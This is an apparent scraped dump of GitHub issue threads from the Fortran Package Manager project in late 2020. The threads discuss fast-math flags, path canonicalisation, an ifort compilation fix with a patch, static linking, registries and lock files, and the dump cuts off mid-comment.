            "text": "#315 removed -ffast-math from default flags because it can cause problems. However, I still want to use it in my projects that work with it and makes them a lot faster. I opened this issue to brainstorm some ways to fix this.\nOne proposal is this: there will be a flag fast-math in fpm.toml that is false by default (if you omit it). If you set it to true, then you signal to fpm that your package works both with and without the -ffast-math flag.\nWhen you run fpm build --release on a package, fpm will examine the fast-math flag in the current package as well as all the dependencies. If they are all true, then it builds everything with -ffast-math. If one of them is false, then it will not use the flag.\nThis proposal should get me what I would like, without breaking things for others. As an example, until we fix stdlib, we would not set its fast-math flag to true which will cause all programs that use it to be compiled without -ffast-math. Package maintainers and end users who do not want to be worried about this simply omit the fast-math flag in their fpm.toml which makes fpm never to compile with -ffast-math.\nPossible issues:\n\nIt is not well defined what exactly fast-math means for each compiler. We can overcome this by being practical: for each compiler that we support, we identify these so-called \"unsafe\" optimizations, and package maintainers that want to take advantage of fast-math (such as myself) will ensure that their package works with it.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-12-23 01:46:44+00:00",
                    "text": "So if I happen to use a case conversion routine from stdlib I cannot build with -ffast-math. That strongly discourages someone from using a lot of packages. Most such options can be used on a single file/routine without adverse affects in being mixed with other routines.  I can compile up all my code with fast-math and still use standard system libraries and X11 Windows for example.  Not all compiler options are like that, but most that have that issue are creating a specific file type,  especially if a lot of package owners do not bother verifying their package can work with -ffast-math. Some options might be able to be flagged as \"safe to mix\". In those cases you could compile all the packages marked as --fast-math compatible instead of compiling nothing with the optimzation flag if one package indicates it is a problem. You would also want a relatively easy way to query the package, hopfully before incorporating into your package, to decide if you want to use it. I have not used gfortran for heavy lifting and primarily use it at home so I am not positive what can be mixed, but the same can apply to optimization levels, unrolling levels for loops, ... so for large packages there has to be more than an on-for-everyone, off-for-everyone option."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-23 07:27:44+00:00",
                    "text": "I would suggest we get #112 working for something simple like optimization levels and than extend on the syntax."
                }
            ]
        },
        {
            "number": 327,
            "user": "urbanjost",
            "date": "2020-12-22 19:35:30+00:00",
            "title": "problems with building with local paths",
            "text": "The only local paths that work reliably are links that point to a directory within the package.\nIf you run the \"hello_complex\" twice it will fail on the second build because of how canon_path assumes all pathnames are relative to the top of the project, and so does not handle pathnames starting with a relative path correctly, and the cache ends up storing something like \".complex_path\" instead of \"../complex_path\"; and full pathnames are stymied by the project dir prefix being appended to the front as \"./\" so   \"/share/fpm/...\" becomes \"./share/fpm/...\".\nThis is particularly vexing for anyone working with packages off-line or at a site with no WWW packages, which is a significant Fortran user base.\nIt was relatively easy to fix when you could make the assumption all the platforms are Posix and so you can call realpath(3c), and SOME Fortran compilers actually call realpath(3c) when you do an INQUIRE by name (but there is no requirement in the standard for that, and  gfortran does not do that).\nSo either everything has to be bundled into a single package directory or all dependencies have to be from a git repository,\nor for some cases you have to delete the build directory between each build.\nShould the solution be to pursue a real canonical name routine that would be useful for stdlib also?  (I hear that in some circumstances there is no such thing on some Windows machines,but you can usually get \"close enough\" on normal MSWIndows boxes) or should the current solution be patched up or should the program only support \"internal\" package copies?  The canon_path routine is pretty easy to change to handle paths outside of the project directory, which gets rid of the bad cache files being generated with corrupted relative pathnames, but a real realpath(3c) would have other uses  (it is of course trivial to call realpath(3c) itself on POSIX platforms).\nIt also raises the question of having as part of the QA a complete build of some complex packages that runs TWICE.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-22 19:49:27+00:00",
                    "text": "Thanks for testing, I haven't considered that the canon_path normalization might cause issues. I agree that we have to improve the path handling.\nDirectories outside of the current scope should be discouraged, but possible with the current infrastructure, keeping leading ../ entries in canon_path should be possible. Also for absolute paths, either a quick check for the nature of the path (relative or absolute) or a more robust join_path routine which returns an absolute path if you join . and absolute path is required."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-23 12:23:36+00:00",
                    "text": "Thanks for reporting @urbanjost. I'll look into solutions for this"
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-23 14:48:39+00:00",
                    "text": "An issue with realpath(3) is that it does not work for non-existent paths which is something we need I think.\nWorking on a possible fix here using getcwd to generate an absolute canonical path. Not yet sure if this is a good solution to pursue or not."
                }
            ]
        },
        {
            "number": 324,
            "user": "urbanjost",
            "date": "2020-12-21 20:18:29+00:00",
            "title": "Might know why fpm does not compile with ifort",
            "text": "I was trying to track down what might be an error I made in a private test version of fpm and wanted to build with ifort for sundry reasons; but ifort is very strict about scope collisions and gfortran is very forgiving about that. I had issues building with ifort and I have a little script that is\nsaying it probably is correctable by changing the use of toml_table.  Has anyone looked at that or iis nterested in it?  It also indicates the module \"testsuite\" in the tests should be renamed. I will just kludge my copy if no one is interested. Basically\nthe pertinent cryptic lines from running discovery are the first three lines.\ncollisions: toml_table  duplicate definition. Only being public from one source is the easiest remedy\ncollisions: testsuite   used as a module name and as variable in same scope\ncollisions: len         an intrinsic name is not recommended as an export value unless overloading\n====================================================================================================================================\nnear collisions:\nsrc/fpm/manifest.f90:               public :: package_config_t\nsrc/fpm/manifest/package.f90:       public :: package_config_t     DEFINED IN module fpm_manifest_package\n\nUSED IN\nsrc/fpm/manifest.f90:     use fpm_manifest_package, only : package_config_t, new_package\n\nNOT USED FROM SOURCE\nsrc/fpm.f90:              use fpm_manifest, only : get_package_data, package_config_t\nsrc/fpm/cmd/install.f90:  use fpm_manifest, only : package_config_t, get_package_data\nsrc/fpm/cmd/update.f90:   use fpm_manifest, only : package_config_t, get_package_data\nsrc/fpm/dependency.f90:   use fpm_manifest, only : package_config_t, dependency_config_t, &\n====================================================================================================================================\nsrc/fpm/manifest/dependency.f90:    public :: dependency_config_t  DEFINED IN module fpm_manifest_dependency\nsrc/fpm/manifest.f90:               public :: dependency_config_t\n\nUSED IN\nsrc/fpm.f90:                        use fpm_manifest_dependency, only: dependency_config_t\nsrc/fpm/manifest/executable.f90:    use fpm_manifest_dependency, only : dependency_config_t, new_dependencies\nsrc/fpm/manifest/test.f90:          use fpm_manifest_dependency, only : dependency_config_t, new_dependencies\nsrc/fpm/manifest/example.f90:       use fpm_manifest_dependency, only : dependency_config_t, new_dependencies\nsrc/fpm/manifest/package.f90:       use fpm_manifest_dependency, only : dependency_config_t, new_dependencies\nsrc/fpm/manifest.f90:               use fpm_manifest_dependency, only : dependency_config_t\n\nNOT USED FROM SOURCE\nsrc/fpm/dependency.f90:             use fpm_manifest, only : package_config_t, dependency_config_t, &\n====================================================================================================================================\nsrc/fpm/dependency.f90:             public :: resize\nsrc/fpm_strings.f90:                public :: resize\n====================================================================================================================================\nsrc/fpm/toml.f90:                   public :: len\n====================================================================================================================================",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 20:29:53+00:00",
                    "text": "I'm surprised that Intel Fortran is making problems here, TOML-Fortran is even tested constantly with ifort in a CI workflow. The reexporting was never an issue for me with the Intel compilers so far (in my experience ifort is usually more forgiving than gfortran).\nI stumbled upon the collision with testsuite a while ago in another project, but this is easy to fix by renaming one variable in test/fpm-test/main.f90."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 20:49:06+00:00",
                    "text": "TOML-Fortran is reexporting the toml_table derived type twice, from tomlf_type_table to tomlf_type and finally to the public module tomlf, the third reexport in fpm_toml seems to be breaking for some reason. In the TOML-Fortran project itself this issue is not occurring even if the same scheme is used all over the place... can't really make sense out of this."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-21 20:53:00+00:00",
                    "text": "It looks to not be f-toml but the re-exporting in fpm. I like doing something similar but it would go away if the TOML module was used directly. At this point I believe everyone is comfortable with fpm itself being built with gfortran there are reasons it would be nice if it also built with ifort, at least for development."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-21 20:56:25+00:00",
                    "text": "Yep. I think I misspoke about it not being in f-toml.  Just looking at it myself in more depth; thought it might be a bug in ifort around extending types. I made a quick one where everything is exported from where the type is defined and it compiles and runs but does not work properly. Still looking ..."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 21:05:09+00:00",
                    "text": "I introduced the fpm_toml module as proxy to allow a central place to interact with TOML-Fortran. It is probably not related to the reexporting, because I have an example package in TOML-Fortran which uses a similar proxy module and builds just fine with ifort.\nOne thing that might cause the issue is the fact that I'm overloading the build interface (get_value) already provided by TOML-Fortran with fpm specific routines in fpm_toml to reduce code duplication for reading into arrays of string_t."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 21:11:40+00:00",
                    "text": "Apparently appending to an overloaded interface throws off the type identification in ifort, which is most likely a compiler bug.\nHere is a patch to fix compilation with ifort:\ndiff --git a/fpm/src/fpm/manifest/build.f90 b/fpm/src/fpm/manifest/build.f90\nindex d96974f..31abb3c 100644\n--- a/fpm/src/fpm/manifest/build.f90\n+++ b/fpm/src/fpm/manifest/build.f90\n@@ -12,7 +12,7 @@\n module fpm_manifest_build\n     use fpm_error, only : error_t, syntax_error, fatal_error\n     use fpm_strings, only : string_t\n-    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value\n+    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value, get_string_list\n     implicit none\n     private\n \n@@ -84,7 +84,7 @@ contains\n         end if\n \n \n-        call get_value(table, \"link\", self%link, error)\n+        call get_string_list(table, \"link\", self%link, error)\n         if (allocated(error)) return\n \n     end subroutine new_build_config\ndiff --git a/fpm/src/fpm/manifest/example.f90 b/fpm/src/fpm/manifest/example.f90\nindex fc2a0af..3f02185 100644\n--- a/fpm/src/fpm/manifest/example.f90\n+++ b/fpm/src/fpm/manifest/example.f90\n@@ -18,7 +18,7 @@ module fpm_manifest_example\n     use fpm_manifest_dependency, only : dependency_config_t, new_dependencies\n     use fpm_manifest_executable, only : executable_config_t\n     use fpm_error, only : error_t, syntax_error\n-    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value\n+    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value, get_string_list\n     implicit none\n     private\n \n@@ -70,7 +70,7 @@ contains\n             if (allocated(error)) return\n         end if\n \n-        call get_value(table, \"link\", self%link, error)\n+        call get_string_list(table, \"link\", self%link, error)\n         if (allocated(error)) return\n \n     end subroutine new_example\ndiff --git a/fpm/src/fpm/manifest/executable.f90 b/fpm/src/fpm/manifest/executable.f90\nindex be02974..3468828 100644\n--- a/fpm/src/fpm/manifest/executable.f90\n+++ b/fpm/src/fpm/manifest/executable.f90\n@@ -14,7 +14,7 @@ module fpm_manifest_executable\n     use fpm_manifest_dependency, only : dependency_config_t, new_dependencies\n     use fpm_error, only : error_t, syntax_error\n     use fpm_strings, only : string_t\n-    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value\n+    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value, get_string_list\n     implicit none\n     private\n \n@@ -81,7 +81,7 @@ contains\n             if (allocated(error)) return\n         end if\n \n-        call get_value(table, \"link\", self%link, error)\n+        call get_string_list(table, \"link\", self%link, error)\n         if (allocated(error)) return\n \n     end subroutine new_executable\ndiff --git a/fpm/src/fpm/manifest/test.f90 b/fpm/src/fpm/manifest/test.f90\nindex bcacbd8..832fff0 100644\n--- a/fpm/src/fpm/manifest/test.f90\n+++ b/fpm/src/fpm/manifest/test.f90\n@@ -18,7 +18,7 @@ module fpm_manifest_test\n     use fpm_manifest_dependency, only : dependency_config_t, new_dependencies\n     use fpm_manifest_executable, only : executable_config_t\n     use fpm_error, only : error_t, syntax_error\n-    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value\n+    use fpm_toml, only : toml_table, toml_key, toml_stat, get_value, get_string_list\n     implicit none\n     private\n \n@@ -70,7 +70,7 @@ contains\n             if (allocated(error)) return\n         end if\n \n-        call get_value(table, \"link\", self%link, error)\n+        call get_string_list(table, \"link\", self%link, error)\n         if (allocated(error)) return\n \n     end subroutine new_test\ndiff --git a/fpm/src/fpm/toml.f90 b/fpm/src/fpm/toml.f90\nindex dbaafcb..84a4683 100644\n--- a/fpm/src/fpm/toml.f90\n+++ b/fpm/src/fpm/toml.f90\n@@ -25,11 +25,7 @@ module fpm_toml\n     public :: toml_table, toml_array, toml_key, toml_stat, get_value, set_value\n     public :: new_table, add_table, add_array, len\n     public :: toml_error, toml_serializer, toml_parse\n-\n-\n-    interface get_value\n-        module procedure :: get_child_value_string_list\n-    end interface get_value\n+    public :: get_string_list\n \n \n contains\n@@ -71,7 +67,7 @@ contains\n     end subroutine read_package_file\n \n \n-    subroutine get_child_value_string_list(table, key, list, error)\n+    subroutine get_string_list(table, key, list, error)\n \n         !> Instance of the TOML data structure\n         type(toml_table), intent(inout) :: table\n@@ -114,7 +110,7 @@ contains\n             end if\n         end if\n \n-    end subroutine get_child_value_string_list\n+    end subroutine get_string_list\n \n \n end module fpm_toml\ndiff --git a/fpm/test/fpm_test/main.f90 b/fpm/test/fpm_test/main.f90\nindex bc81dc1..fa0190e 100644\n--- a/fpm/test/fpm_test/main.f90\n+++ b/fpm/test/fpm_test/main.f90\n@@ -13,12 +13,12 @@ program fpm_testing\n     implicit none\n     integer :: stat, is\n     character(len=:), allocatable :: suite_name, test_name\n-    type(testsuite_t), allocatable :: testsuite(:)\n+    type(testsuite_t), allocatable :: suite(:)\n     character(len=*), parameter :: fmt = '(\"#\", *(1x, a))'\n \n     stat = 0\n \n-    testsuite = [ &\n+    suite = [ &\n         & new_testsuite(\"fpm_toml\", collect_toml), &\n         & new_testsuite(\"fpm_manifest\", collect_manifest), &\n         & new_testsuite(\"fpm_source_parsing\", collect_source_parsing), &\n@@ -32,29 +32,29 @@ program fpm_testing\n     call get_argument(2, test_name)\n \n     if (allocated(suite_name)) then\n-        is = select_suite(testsuite, suite_name)\n-        if (is > 0 .and. is <= size(testsuite)) then\n+        is = select_suite(suite, suite_name)\n+        if (is > 0 .and. is <= size(suite)) then\n             if (allocated(test_name)) then\n-                write(error_unit, fmt) \"Suite:\", testsuite(is)%name\n-                call run_selected(testsuite(is)%collect, test_name, error_unit, stat)\n+                write(error_unit, fmt) \"Suite:\", suite(is)%name\n+                call run_selected(suite(is)%collect, test_name, error_unit, stat)\n                 if (stat < 0) then\n                     error stop 1\n                 end if\n             else\n-                write(error_unit, fmt) \"Testing:\", testsuite(is)%name\n-                call run_testsuite(testsuite(is)%collect, error_unit, stat)\n+                write(error_unit, fmt) \"Testing:\", suite(is)%name\n+                call run_testsuite(suite(is)%collect, error_unit, stat)\n             end if\n         else\n             write(error_unit, fmt) \"Available testsuites\"\n-            do is = 1, size(testsuite)\n-                write(error_unit, fmt) \"-\", testsuite(is)%name\n+            do is = 1, size(suite)\n+                write(error_unit, fmt) \"-\", suite(is)%name\n             end do\n             error stop 1\n         end if\n     else\n-        do is = 1, size(testsuite)\n-            write(error_unit, fmt) \"Testing:\", testsuite(is)%name\n-            call run_testsuite(testsuite(is)%collect, error_unit, stat)\n+        do is = 1, size(suite)\n+            write(error_unit, fmt) \"Testing:\", suite(is)%name\n+            call run_testsuite(suite(is)%collect, error_unit, stat)\n         end do\n     end if"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-21 22:47:32+00:00",
                    "text": "Wow. That was  fast. Thanks!  There is still an issue actually running fpm to build with with the patched version but the patch worked to build fpm with and I was still circling around the issue when your patch showed up!  That is exotic enough of an issue that I'm not sure, but I do not know of anything that violates in the standard off the bat so it does smell like a compiler bug."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 22:57:41+00:00",
                    "text": "The Intel compiled version will have slightly different interpretations of some file system functions, namely inquire on directories, which is used in the exists function in fpm_filesystem,  just a wild guess."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-22 17:14:07+00:00",
                    "text": "The Intel compiled version will have slightly different interpretations of some file system functions, namely inquire on directories, which is used in the exists function in fpm_filesystem, just a wild guess.\n\nYes it looks like there are several uses of exists to check for a directory, these could be replaced with is_dir for compatibility with ifort."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-28 20:38:58+00:00",
                    "text": "Thanks! That worked great with a little additional adjustments. I am closing this now, as it looks for the foreseeable future fpm looks like it will be built with gfortran; but I had a specific need for a custom build."
                }
            ]
        },
        {
            "number": 323,
            "user": "urbanjost",
            "date": "2020-12-21 19:55:37+00:00",
            "title": "Consider adding -static for ifort compiler so -traceback works properly",
            "text": "An original reading of the Intel documentation missed this:\nNOTE:  If  you want to use traceback, you must also link to the static version of the libgcc library. This library\nenables printing of backtrace information.\nSo -static has to be added to the default for this to work, as referred to in a discussion about fman from @certik.\nThis would limit what external libraries can be linked to on quiet a few platforms, so perhaps   -static-libgcc (L*X only)\nconditionally on ULS platforms (?).\nI prefer -static as a default but the platform suppliers do not, and it makes using a lot of parallel programming interfaces impossible or near to it.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 20:20:08+00:00",
                    "text": "Static linking is a difficult topic, I'm not on a particular side here, but rather on both sides at once...\nAs a project maintainer on the one hand, I'm usually distributing statically linked binaries and my build files also default to this behaviour at least with ifort. Yet it had let to frequent discussions and request to remove static linking. Usually this requests are originating from the OSX community were static linking is not possible at all (-static-intel might still work on OSX) or the Red Hat Linux Distributions where certain libraries are not available for static linking. Over the last year I got more than a dozen request on this topic and had to implement various workarounds for the particularities of certain distributions or platforms.\nAs a packager for conda-forge on the other hand, I'm always trying to go for shared libraries even for Fortran projects where this is a bit tricky due to ABI compatibility issues, but the conda-forge pinning mechanism allows for stricter version constraints to ensure ABI compatibility between dependencies and therefore minimizes the required package rebuilds.\nWe are currently distributing statically linked binaries for fpm itself, the CI setup from this repository is something you could adapt for your fman project."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-22 14:15:47+00:00",
                    "text": "Hi @urbanjost, are you able to elaborate further on why static linking is needed for the traceback? The traceback should work for non-library code with dynamic linking. This appears to be the case in Ondrej's second output dump where I can see the frame for testit at app/fpm_intrinsics.f90:80 and I assume the preceding frames are from a dynamically linked library.\nAm I right in thinking you want traceback information for the full stack including linked libraries? My experience is that traceback information from the linked libraries isn't usually helpful \u2014 it is sufficient for me to know where in my code the error occurs.\nFor the reasons already mentioned I am wary of making static linking the default, even just to libgcc.\nEDIT: Though I agree that having the option to enable static linking is certainly beneficial."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-22 19:46:02+00:00",
                    "text": "At least on my RedHat8 machine the traceback is just a backtrace of addresses without using the static libgcc with the ifort compiler; and the manpage for ifort says it is required on Lnx machines in one place in the document; although it does not mention it in several other places -- it only mentioned it when discussing the switch for static libgcc.  So maybe it is not a problem on all platforms.  I will look at the actual Intel documentation site and maybe try the Intel forum for some clarification.\nDefinitely need to revisit an equivalent of the --flags option on h-fpm for f-fpm."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-23 15:03:49+00:00",
                    "text": "Simple example traceback with ifort on my machine:\n/tmp/a$ cat src/a.f90 \nmodule a\n  implicit none\n  private\n\n  public :: say_hello\ncontains\n  subroutine say_hello\n    print *, \"Hello, a!\",1/0\n  end subroutine say_hello\nend module a\n/tmp/a$ ffpm run --compiler ifort\n + build/ifort_debug/app/a \nforrtl: severe (71): integer divide by zero\nImage              PC                Routine            Line        Source             \na                  0000000000403A3B  Unknown               Unknown  Unknown\nlibpthread-2.27.s  00007FF0FA1CE8A0  Unknown               Unknown  Unknown\na                  0000000000402B58  a_mp_say_hello_             8  a.f90\na                  0000000000402AD6  MAIN__                      5  main.f90\na                  0000000000402AA2  Unknown               Unknown  Unknown\nlibc-2.27.so       00007FF0F9BE8B97  __libc_start_main     Unknown  Unknown\na                  00000000004029AA  Unknown               Unknown  Unknown\n Command failed\nERROR STOP \n\nError termination. Backtrace:\n#0  0x7f33ebad3aed in ???\n#1  0x7f33ebad4605 in ???\n#2  0x7f33ebad5c93 in ???\n#3  0x55a39474ecd4 in __fpm_environment_MOD_run\n\tat src/fpm_environment.f90:127\n#4  0x55a394720049 in __fpm_MOD_cmd_run\n\tat src/fpm.f90:346\n#5  0x55a39471c63d in MAIN__\n\tat app/main.f90:37\n#6  0x55a39471c703 in main\n\tat app/main.f90:9\n/tmp/a$ ifort --version\nifort (IFORT) 19.1.0.166 20191121\nCopyright (C) 1985-2019 Intel Corporation.  All rights reserved.\n\nlk12325@ljk-laptop:/tmp/a$ uname -a\nLinux laptop 5.4.0-58-generic #64~18.04.1-Ubuntu SMP Wed Dec 9 17:11:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n\nAs expected in the Intel backtrace I can see the two relevant frames for my code: a_mp_say_hello_ (a.f90:8) and MAIN__ (main.f90:5)."
                },
                {
                    "user": "certik",
                    "date": "2020-12-23 17:34:21+00:00",
                    "text": "I firmly believe fpm needs to support static linking of Fortran binaries. That is a frequent and common use case.\nIn addition, we should also support dynamic linking for things like conda-forge or Debian.\nThat means for example the cmake backend that I plan to write should support both.\nSo the only question is how to specify this from the fpm point of view: it seems a command line switch like fpm build --static or something like that should work? We can argue about which way should be the default, I am fine either way."
                }
            ]
        },
        {
            "number": 322,
            "user": "LKedward",
            "date": "2020-12-21 15:42:41+00:00",
            "title": "Group sources by package in the model",
            "text": "Opening for feedback. Following the discussion here this PR implements a minimal set of changes to group source files by their originating package. This is primarily to facilitate the writing of third-party build back-ends but will also help separate static libraries for dependencies in a future PR like the Haskell version.\nThere are no changes to the targets that fpm generates in this PR.\nThe sources list in the model is replaced by a packages list where for now the new package_t type only contains a list of sources.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-24 10:47:42+00:00",
                    "text": "Thanks for the quick reviews; I've merged the latest changes from #291 and updated the info_model routines accordingly.\nYep you're right @certik, package dependency information is currently not captured at the level of the srcfile_t type."
                },
                {
                    "user": "certik",
                    "date": "2020-12-24 12:23:45+00:00",
                    "text": "Looks good to merge. Thanks!\n\u2026\nOn Thu, Dec 24, 2020, at 3:47 AM, Laurence Kedward wrote:\n\n\n Thanks for the quick reviews; I've merged the latest changes from #291\n <#291> and updated the\n `info_model` routines accordingly.\n\n Yep you're right @certik <https://github.com/certik>, package\n dependency information is currently not captured at the level of the\n `srcfile_t` type.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#322 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHQHE2RMOYSXVB5BYDSWML5ZANCNFSM4VEMD3SQ>."
                }
            ]
        },
        {
            "number": 321,
            "user": "awvwgk",
            "date": "2020-12-20 18:01:01+00:00",
            "title": "Implement support for a local registry",
            "text": "Before we make fpm aware of the fpm-registry, we should create a minimal working implementation for a local registry (this registry might even be built-in to simplify things a bit at the beginning).\nIn analogy to Cargo we could use a syntax like:\n[dependencies]\n[dependencies.toml-f]\nversion = \"^0.2.1\"\nregistry = \"internal\"  # or URI to a registry\n[dependencies.M_CLI2]\nversion = \"^0.1.0\"\nregistry = \"default\"  # for whatever the default URI will be\nThis requires:\n\na way to specify and match version requirements (src/fpm/versioning.f90 defines only a version type)\nthe possibility to cache dependencies in a project (we have build/cache.toml, alternatively a lock file)\na format for the registry (JSON?, TOML?, XML?, SQL?) and an fpm package implementing the format\n(the fpm-registry has both TOML and JSON representations of the registry right now)\nan interface to fetch from URIs that are not local:// or file:// (libcurl interface or just shell escape to curl/wget)\n\nA full registry is discussed in #35",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-21 12:32:40+00:00",
                    "text": "This is a sensible approach. I think it would be beneficial to be able to specify a local path.\nFor parsimony it makes sense to use TOML for the registry format, to avoid needing an additional dependency.\nFor fpm-registry, I distinguish between the TOML registry file and the JSON index file; the former is manually edited and hence contains the minimum information necessary, whereas the latter is generated from the former and contains additional information required for browsing/searching packages. Some dependency information is also included which could be used to fetch dependencies faster. JSON was used merely because I thought I'd need to load it dynamically with Javascript, but then I realised that Jekyll could consume it directly. So the index format can change."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-21 14:25:51+00:00",
                    "text": "Should fpm be able to consume both a registry file and an index file (generating the latter by processing the former)?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-21 14:37:42+00:00",
                    "text": "I had envisaged that fpm would only interact with the index file since it can convey information stored within the package manifest without needing to download the package.\nGenerating the index requires downloading every package in the registry and reading its manifest, so I'm not sure we want fpm to do that?"
                }
            ]
        },
        {
            "number": 320,
            "user": "awvwgk",
            "date": "2020-12-20 17:11:57+00:00",
            "title": "Create a dependency lock file",
            "text": "The current dependency handler creates a cache in build/cache.toml which was intended as prototype for the lock file, for fpm the cache would look like:\n[fpm]\nversion = \"0.1.3\"\nproj-dir = \".\"\n[toml-f]\nversion = \"0.2.1\"\nproj-dir = \"build/dependencies/toml-f\"\ngit = \"https://github.com/toml-f/toml-f\"\nobj = \"2f5eaba864ff630ba0c3791126a3f811b6e437f3\"\nrev = \"2f5eaba864ff630ba0c3791126a3f811b6e437f3\"\n[M_CLI2]\nversion = \"0.1.0\"\nproj-dir = \"build/dependencies/M_CLI2\"\ngit = \"https://github.com/urbanjost/M_CLI2.git\"\nobj = \"e59fb2bfcf36199f1af506f937b3849180454a0f\"\nrev = \"e59fb2bfcf36199f1af506f937b3849180454a0f\"\nNote that the git object in package manifest is currently used in fpm as alternative to a lock file. The information required for the lock file should boil down to the package name, its version and the git revision, which are already present in the dependency cache.\nIn principle, we have everything together to promote the dependency cache to a dependency lock (fpm.lock?).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-12-23 00:30:48+00:00",
                    "text": "Yes, fpm.lock like Cargo.lock."
                }
            ]
        },
        {
            "number": 317,
            "user": "urbanjost",
            "date": "2020-12-19 22:48:07+00:00",
            "title": "subcommand update updates from cache list and so still updated deleted dependencies",
            "text": "A small issue, but starting with a program with a dozen external dependencies and working on it mostly being self-contained\nI was down to three external dependencies but an update still continued to refresh all the dependencies I started with, requiring me to either delete the build/ directory or edit the cache list in build/.  Relatively easy to work around if you know it has a cache,\nand maybe not a typical use case but it would be nice if only currently active dependencies are updated/built/listed .... If an update rebuilt the cache list I think that would be sufficient -- low priority but would be nice if that were \"clean\" in this respect. Probably not necessary to actually delete the unused dependencies files, that might even be undesirable.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-20 10:27:30+00:00",
                    "text": "There is fpm update --clean for this purpose, this will discard the cache and start from scratch."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-20 16:21:01+00:00",
                    "text": "Yes; that works great; just considering whether the currently listed dependencies should be referenced instead of the cache.\nThe behavior of fpm has changed with the cache being added.  It stil appears to check the fpm.toml file if a completely new dependency is added but then does not automatically quit building ones no longer referenced. Seemed like the user-facing file (the fpm.toml manifest) should drive what is built and run automatically.  If I add something to the fpm.toml file it starts building it; so if I remove something from the fpm.toml file it would be nice if it quit building it.  Seems more consistent.\nDeleting dependenciesis probably far less frequent than adding them will be but in this case taking a dozen out of the fpm.toml\nfile and still seeing them build when I tried a few other compilers or a --release build felt surprising and seemed like it might be\nsome low hanging fruit to improve.  update has been working great otherwise. Nice to not have to wipe the build/ directory every time something goes awry or needs updated."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-20 17:38:17+00:00",
                    "text": "Thanks for the feedback, the cache was meant as prototype for the dependency lock file. Since we are automatically adding dependencies we should have the same feature for the deletion of dependencies as well."
                }
            ]
        },
        {
            "number": 316,
            "user": "urbanjost",
            "date": "2020-12-18 17:07:09+00:00",
            "title": "Update subcommand \"new\" to reflect the addition of support for the ex\u2026",
            "text": "\u2026ample/ directory\nThe \"new\" subcommand was updated with an --example switch in line with the other\nstandard directories. Corresponding changes were made to the documentation and\nthe test of the \"new\" subcommand. This reflects the addition of --example to the\n\"run\" subcommand and the model changes to automatically build applications found\nin the example/ directory.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-12-18 17:07:41+00:00",
                    "text": "This should close #306"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-21 00:29:04+00:00",
                    "text": "I think example/ and a program source file in it should be created by default, as originally implemented in this PR, and for the same reason that @urbanjost explained above.\nLet's get more eyes on this. @certik @everythingfunctional @LKedward what do you think is a saner default?\nOtherwise I think this PR is good to go."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-21 00:30:46+00:00",
                    "text": "If we choose creating example/ as default, what's the purpose of \"fpm new ... --example\"?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-21 00:41:28+00:00",
                    "text": "They are all created by default, but conditionally if any name is supplied. So if you really only wanted src/ or app/ you can do that\nso you could create a project that only added examples to an external project that only had a src/ directory; you can change your mind and do a --backfill  (although there is a current problem where you cannot say \".\" but have to do something like \"fpm new pwd --backfill\" if you are sitting in the directory, but we do not have a portable realpath(3c) equivalent yet), ...\nSo primarily for someone who created a package without some of the directories and wants to use \"fpm new --backfill\" because things are growing.  Admittedly, an experienced user might say \"mkdir example\"."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-21 00:43:16+00:00",
                    "text": "@urbanjost ah, got it, it makes sense."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-21 00:56:52+00:00",
                    "text": "An experienced user may not even need \"new\"; but I found new users confused (as I was) as to what to do next with a very old version of h-fpm when I wanted to try it out (as it did not make anything by default, if I remember right) ; and I think at least the directories with an associated command should be created by default (\"run\", \"test\") and a good number of projects will need a src/ directory (although a good number may just need app/ as more packages and stdlib become available).  I still prefer having example included because I think an advanced user hardly needs \"new\" and a new user does, and for the reasons above, but have been thinking after trying to move existing projects that having an option in the fpm.toml file that allowed adding directory names to the auto-build list might be another path; and did not see much reaction to my preference for it to be symetricall with \"run --app --test --example -bench \" and commands \"run\", \"test\", \"example\",\"bench\" which would just be abbreviations for \"run --example\", \"run --bench\", ...  so I was thinking long-term being able to specify a list of directories to auto-build and a run option like \"run --dir NAME\" might be a more generic solution. So I prefer example/ being built, but long-term do any of those alternatives and a \"new --template\" might be a longer-term solution?  I could even see an interactive mode where I get prompted, like 